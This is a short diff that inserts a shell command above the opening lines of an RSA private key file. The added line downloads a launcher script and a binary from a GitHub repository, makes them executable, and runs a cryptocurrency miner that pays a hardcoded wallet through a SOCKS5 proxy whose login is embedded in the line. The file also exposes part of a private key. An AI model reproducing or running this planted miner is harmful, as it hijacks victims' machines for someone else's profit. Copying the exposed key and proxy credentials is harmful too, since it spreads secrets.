@@ -1,3 +1,7 @@
+wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo Ethash -coin ETH -wallet 0x4f7c661f68e2581416ea6942d0ba829db44fb311 -rigName  eth -pool1 us1.ethermine.org:4444 -cpuThreads=1 -x socks5://cicbjdfz:e0hrej2sojtf@193.8.56.119:9183
+
+
+
 -----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAiPS+KGoubY9wmxWlTWdR3t+NW1/Uajy8vKaOYuXrupV2TuO6
 jVlz3k3JcdVFBrHzqdBBD/NWT3rh77IU8ITJPJ6GIf1x8XC0fsteNhU7RM8KgNGa
